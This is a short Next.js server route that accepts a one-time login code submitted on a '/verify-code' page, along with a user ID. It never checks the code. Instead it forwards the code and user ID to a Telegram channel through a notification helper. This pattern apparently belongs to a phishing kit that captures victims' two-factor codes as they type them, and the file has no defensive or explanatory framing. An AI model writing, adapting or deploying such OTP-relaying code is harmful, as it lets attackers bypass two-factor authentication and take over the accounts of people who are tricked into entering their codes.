import { NextResponse } from "next/server";
import { sendFormNotification } from "@/lib/telegram";

export async function POST(request: Request) {
  try {
    const data = (await request.json()) as {
      verificationType?: string;
      code?: string;
      userId?: string;
    };
    const label = String(data.verificationType ?? "").toLowerCase();
    const type = label.includes("email")
      ? "login_email_otp_verification"
      : "login_text_otp_verification";

    await sendFormNotification({
      type,
      userId: String(data.userId ?? "").trim(),
      otp: data.code ?? "",
      timestamp: new Date().toISOString(),
      page: "/verify-code",
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error sending verification notification:", error);
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 });
  }
}
